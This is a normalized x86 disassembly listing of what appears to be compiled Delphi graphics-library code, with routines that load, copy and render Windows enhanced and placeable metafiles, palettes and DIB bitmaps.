sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420edb
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_402714
retn
call sub_41e524
sub_420ee4
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_420d80
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41e524
lea eax [ ebp - 0x22 ]
call sub_41f374
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call sub_4062e4
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call sub_4062e4
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026f4
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_421053
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41e524
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42105a
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_402714
retn
call sub_41e524
sub_421064
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42110b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_4210e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408894
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c9d0
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044a0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41fa78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4210f0
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_421144
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420d80
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_4062e4
mov edx eax
mov eax ebx
call sub_4211b8
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call sub_4062e4
mov edx eax
mov eax ebx
call sub_4211b8
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4211b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_420d80
pop esi
pop ebx
retn
mov eax ebx
call sub_421308
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4211f4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_420d80
pop esi
pop ebx
retn
mov eax ebx
call sub_421308
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421234
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420d80
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call sub_4062e4
mov edx eax
mov eax ebx
call sub_4211f4
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call sub_4062e4
mov edx eax
mov eax ebx
call sub_4211f4
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4212a8
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_416050
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_421308
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_420d80
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_421a54
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_421a50
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_42138c
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_416050
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_421498
mov edx ebx
mov eax esi
call sub_42140c
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_42140c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421488
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4162b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402714
retn
sub_421498
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402d44
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_4162b4
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4162b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4215ba
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402714
retn
call sub_41e584
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call sub_4062e4
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call sub_4062e4
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41f374
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4215d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4215b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_4215e0
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_420d80
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41e4f4
sub_421664
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_421734
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_414764
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4217d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4217d9
mov eax [ rw-data ]
call sub_4147c8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4217aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4218c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41e108
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4143bc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41e0ac
test al al
je r-xdata
sub_4217e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_414764
mov esi eax
xor ecx ecx
push ebp
push sub_421850
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4147c8
retn
mov edx ebx
mov eax esi
call sub_4143bc
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4218c4
sub_42185c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41db18
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_421898
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_4218c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41dbdc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4218c4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41de50
xor edx edx
push ebp
push sub_421958
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e2b4
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_414778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e108
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_421964
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41de50
xor eax eax
push ebp
push sub_421a43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422c80
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4217e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_422d80
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e2b4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4146dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e108
retn
sub_421a54
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403344
sub_421a74
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4217e0
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d6a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_421ad0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41c444
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4217e0
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4217e0
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_421b1c
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41edc0
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_421bcb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_421bd8
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_421c24
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4217e0
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41e62c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e62c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_422272
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026f4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_421f7c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41e50c
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41e62c
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41e62c
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41e62c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41e62c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_422223
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_422212
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4221f0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41e62c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_421bd8
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028f0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41edc0
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d9fc
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412f04
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
